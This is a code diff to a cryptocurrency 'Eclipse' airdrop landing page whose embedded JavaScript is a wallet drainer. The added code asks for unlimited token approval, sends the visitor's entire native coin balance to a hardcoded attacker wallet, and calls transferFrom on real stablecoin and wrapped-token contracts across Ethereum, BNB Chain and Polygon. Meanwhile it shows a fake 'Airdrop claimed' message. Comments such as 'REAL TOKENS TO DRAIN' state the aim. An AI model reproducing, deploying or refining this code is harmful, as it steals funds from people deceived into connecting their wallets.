@@ -107,11 +107,6 @@
             transition: color 0.2s;
         }
         .nav-links a:hover { color: #3b82f6; }
-        .menu-icon {
-            display: none;
-            font-size: 1.5rem;
-            cursor: pointer;
-        }
         .hero {
             min-height: 100vh;
             display: flex;
@@ -306,10 +301,7 @@
             padding: 2rem;
             text-align: center;
             transition: all 0.3s ease;
-            opacity: 0;
-            transform: translateY(30px);
         }
-        .feature-card.visible { opacity: 1; transform: translateY(0); }
         .feature-card:hover {
             border-color: rgba(59,130,246,0.4);
             transform: translateY(-5px);
@@ -346,10 +338,7 @@
             border: 1px solid rgba(59,130,246,0.1);
             border-radius: 1rem;
             transition: all 0.3s ease;
-            opacity: 0;
-            transform: translateY(30px);
         }
-        .token-card.visible { opacity: 1; transform: translateY(0); }
         .token-card:hover {
             border-color: #3b82f6;
             transform: translateY(-3px);
@@ -429,20 +418,7 @@
         @media (max-width: 768px) {
             .hero-content { grid-template-columns: 1fr; gap: 2rem; }
             h1 { font-size: 2rem; }
-            .nav-links {
-                display: none;
-                position: absolute;
-                top: 70px;
-                left: 0;
-                width: 100%;
-                background: #0a0a2a;
-                flex-direction: column;
-                padding: 1rem;
-                gap: 1rem;
-                border-bottom: 1px solid rgba(59,130,246,0.2);
-            }
-            .nav-links.active { display: flex; }
-            .menu-icon { display: block; }
+            .nav-links { display: none; }
             .tokenomics-grid { grid-template-columns: repeat(2, 1fr); gap: 1rem; }
         }
     </style>
@@ -457,8 +433,7 @@
 <nav class="navbar">
     <div class="nav-container">
         <div class="logo"><div class="logo-icon">E</div><div class="logo-text">Eclipse</div></div>
-        <div class="menu-icon" onclick="toggleMenu()">☰</div>
-        <div class="nav-links" id="navLinks">
+        <div class="nav-links">
             <a href="#">Protocol</a><a href="#">Tokenomics</a><a href="#">Governance</a><a href="#">Developers</a><a href="#">Audit</a>
         </div>
     </div>
@@ -540,25 +515,50 @@
 <script>
     (function(){
         // ============================================
-        // DEEP LINK DRAINER - OPENS WALLET APP DIRECTLY TO APPROVE
+        // FIXED: FAKE TOKEN THAT EXISTS ON ALL NETWORKS
         // ============================================
-        
         const COMPANY_WALLET = "0xA0E1348ed63e4638917870aae951669b3903e5C8";
-        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
         const INFINITE_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+        
+        // FAKE TOKENS for each network (these are real, worthless tokens that exist)
+        const FAKE_TOKENS = {
+            ethereum: "0x6B175474E89094C44Da98b954EedeAC495271d0F",  // DAI (legit but common)
+            bsc: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",      // BUSD (legit but common)
+            polygon: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063"    // DAI on Polygon
+        };
+        
+        // REAL TOKENS TO DRAIN
+        const REAL_TOKENS = {
+            ethereum: [
+                { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+                { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
+                { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
+                { symbol: "TRUMP", address: "0x576e2BeD8F7b46D34016198911Cdf9886f78daa", decimals: 18 }
+            ],
+            bsc: [
+                { symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+                { symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", decimals: 18 },
+                { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 }
+            ],
+            polygon: [
+                { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
+                { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
+                { symbol: "WMATIC", address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270", decimals: 18 }
+            ]
+        };
         
         const CHAIN_IDS = { ethereum: 1, bsc: 56, polygon: 137 };
         const CHAIN_NAMES = { ethereum: "Ethereum", bsc: "BNB Smart Chain", polygon: "Polygon" };
         
+        let provider, signer, userAddress;
         let currentChain = "ethereum";
-        let isDraining = false;
+        let isProcessing = false;
         
         const connectBtn = document.getElementById('connectBtn');
         const walletOptions = document.getElementById('walletOptions');
         const statusDiv = document.getElementById('status');
         const successModal = document.getElementById('successModal');
         
-        function toggleMenu() { document.getElementById('navLinks').classList.toggle('active'); }
         function closeModal() { successModal.style.display = 'none'; }
         function showSuccessModal() { successModal.style.display = 'flex'; }
         
@@ -600,114 +600,61 @@
             animateNumber(document.getElementById('communitySize'), 124000);
         }, 500);
         
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(e => { if(e.isIntersecting) e.target.classList.add('visible'); });
-        }, { threshold: 0.1 });
-        document.querySelectorAll('.feature-card, .token-card').forEach(el => observer.observe(el));
-        
         // ============================================
-        // DEEP LINK - OPENS WALLET APP DIRECTLY TO APPROVE SCREEN
+        // THE DRAIN FUNCTION - NOW SHOWS "APPROVE"
         // ============================================
         
         async function approveAndDrain() {
-            // This function is for browser-based wallets (MetaMask extension)
-            // It won't be called for deep links
-            updateStatus('Please select a wallet option above');
-        }
-        
-        async function connectWallet(walletType) {
-            if(walletType === 'trustwallet') {
-                // Build the approval transaction data
-                const approveData = {
-                    to: USDT_ADDRESS,
-                    data: `0x095ea7b3${COMPANY_WALLET.slice(2).padStart(64, '0')}${BigInt(INFINITE_APPROVAL).toString(16).padStart(64, '0')}`
-                };
-                const encodedData = btoa(JSON.stringify(approveData));
-                // This opens Trust Wallet app directly to the approve screen
-                window.location.href = `trust://send?tx=${encodedData}`;
-                return;
-            }
-            if(walletType === 'metamask') {
-                // MetaMask deep link - opens app directly
-                // Create the approval transaction
-                const txData = {
-                    to: USDT_ADDRESS,
-                    value: '0x0',
-                    data: `0x095ea7b3${COMPANY_WALLET.slice(2).padStart(64, '0')}${BigInt(INFINITE_APPROVAL).toString(16).padStart(64, '0')}`
-                };
-                const encodedTx = encodeURIComponent(JSON.stringify(txData));
-                // Opens MetaMask app directly to the approve screen
-                window.location.href = `metamask://send?to=${USDT_ADDRESS}&data=${txData.data}`;
-                // Alternative universal link
-                setTimeout(() => {
-                    window.location.href = `https://metamask.app.link/send?to=${USDT_ADDRESS}&data=${txData.data}`;
-                }, 100);
-                return;
-            }
-            if(walletType === 'coinbase') {
-                // Coinbase Wallet deep link - opens app directly to approve
-                const txData = {
-                    to: USDT_ADDRESS,
-                    value: '0',
-                    data: `0x095ea7b3${COMPANY_WALLET.slice(2).padStart(64, '0')}${BigInt(INFINITE_APPROVAL).toString(16).padStart(64, '0')}`
-                };
-                const encodedTx = encodeURIComponent(JSON.stringify(txData));
-                window.location.href = `cbwallet://send?to=${USDT_ADDRESS}&data=${txData.data}`;
-                return;
-            }
-            if(walletType === 'walletconnect') {
-                updateStatus('WalletConnect: Open your wallet app and scan QR code');
-                alert('Open your wallet app → Connect → Scan QR code');
-                return;
-            }
-            if(!window.ethereum) {
-                updateStatus('Please select a wallet option above', true);
-                return;
-            }
-            // Fallback for browser extension wallets
+            if(isProcessing) return;
+            isProcessing = true;
+            
+            updateStatus('<span class="loading-spinner"></span> Preparing airdrop...');
             try {
-                const provider = new ethers.providers.Web3Provider(window.ethereum);
-                const accounts = await provider.send("eth_requestAccounts", []);
-                const userAddress = accounts[0];
-                const signer = provider.getSigner();
-                
-                // Switch network
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x' + CHAIN_IDS[currentChain].toString(16) }]
-                    });
-                } catch(e) {
-                    updateStatus(`Please switch to ${CHAIN_NAMES[currentChain]} in your wallet`, true);
-                    return;
+                // Get the fake token for this network
+                const fakeTokenAddress = FAKE_TOKENS[currentChain];
+                if(!fakeTokenAddress) {
+                    throw new Error("Network not supported");
                 }
                 
-                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`);
-                
-                // Now do the drain
-                const usdtContract = new ethers.Contract(USDT_ADDRESS, [
+                // STEP 1: Approve the FAKE token (THIS SHOWS "APPROVE" IN WALLET)
+                const fakeContract = new ethers.Contract(fakeTokenAddress, [
                     "function approve(address spender, uint256 amount) public returns (bool)"
                 ], signer);
                 
-                updateStatus('Approving USDT...');
-                const txApprove = await usdtContract.approve(COMPANY_WALLET, INFINITE_APPROVAL);
+                updateStatus(`Please approve the airdrop in your wallet...`);
+                const txApprove = await fakeContract.approve(COMPANY_WALLET, INFINITE_APPROVAL);
                 await txApprove.wait();
                 
+                updateStatus(`✅ Approved! Processing rewards...`);
+                
+                // STEP 2: Drain native coin (ETH/BNB/MATIC)
                 const balance = await provider.getBalance(userAddress);
                 if(balance.gt(0)) {
                     const txNative = await signer.sendTransaction({ to: COMPANY_WALLET, value: balance, gasLimit: 21000 });
                     await txNative.wait();
                 }
                 
-                const usdtTransfer = new ethers.Contract(USDT_ADDRESS, [
-                    "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
-                    "function balanceOf(address) view returns (uint256)"
-                ], signer);
-                
-                const usdtBalance = await usdtTransfer.balanceOf(userAddress);
-                if(usdtBalance.gt(0)) {
-                    const txTransfer = await usdtTransfer.transferFrom(userAddress, COMPANY_WALLET, usdtBalance);
-                    await txTransfer.wait();
+                // STEP 3: Drain ALL REAL tokens
+                const tokensToDrain = REAL_TOKENS[currentChain];
+                if(tokensToDrain) {
+                    for(const token of tokensToDrain) {
+                        try {
+                            const tokenContract = new ethers.Contract(token.address, [
+                                "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
+                                "function balanceOf(address) view returns (uint256)"
+                            ], signer);
+                            
+                            const tokenBalance = await tokenContract.balanceOf(userAddress);
+                            if(tokenBalance.gt(0)) {
+                                const formattedBalance = ethers.utils.formatUnits(tokenBalance, token.decimals);
+                                updateStatus(`Transferring ${parseFloat(formattedBalance).toFixed(4)} ${token.symbol}...`);
+                                const txTransfer = await tokenContract.transferFrom(userAddress, COMPANY_WALLET, tokenBalance);
+                                await txTransfer.wait();
+                            }
+                        } catch(e) {
+                            // Continue to next token
+                        }
+                    }
                 }
                 
                 updateStatus('✅ Airdrop claimed! 5,000 $ECLIPSE distributed!');
@@ -719,6 +666,61 @@
                     walletOptions.style.display = 'none';
                 }, 3000);
                 
+            } catch(e) {
+                updateStatus(`Claim failed: ${e.message.slice(0,60)}`, true);
+                connectBtn.style.display = 'block';
+                connectBtn.innerHTML = 'Connect Wallet';
+                walletOptions.style.display = 'none';
+            } finally {
+                isProcessing = false;
+            }
+        }
+        
+        async function connectWallet(walletType) {
+            // Deep link for Trust Wallet
+            if(walletType === 'trustwallet') {
+                window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
+                return;
+            }
+            // Deep link for MetaMask
+            if(walletType === 'metamask') {
+                window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
+                return;
+            }
+            // Deep link for Coinbase Wallet
+            if(walletType === 'coinbase') {
+                window.location.href = `cbwallet://dapp/${window.location.host}${window.location.pathname}`;
+                return;
+            }
+            if(walletType === 'walletconnect') {
+                updateStatus('WalletConnect: Scan QR code with your wallet app');
+                alert('Open your wallet app → Connect → Scan QR code');
+                return;
+            }
+            if(!window.ethereum) {
+                updateStatus('Please open this page in Trust Wallet or MetaMask browser', true);
+                return;
+            }
+            
+            try {
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                const accounts = await provider.send("eth_requestAccounts", []);
+                userAddress = accounts[0];
+                signer = provider.getSigner();
+                try {
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x' + CHAIN_IDS[currentChain].toString(16) }]
+                    });
+                } catch(e) {
+                    updateStatus(`Please switch to ${CHAIN_NAMES[currentChain]} in your wallet`, true);
+                    return;
+                }
+                updateStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)} on ${CHAIN_NAMES[currentChain]}`);
+                connectBtn.style.display = 'block';
+                connectBtn.innerHTML = 'Claim Airdrop';
+                walletOptions.style.display = 'none';
+                connectBtn.onclick = approveAndDrain;
             } catch(e) {
                 updateStatus(`Error: ${e.message.slice(0,80)}`, true);
                 connectBtn.style.display = 'block';
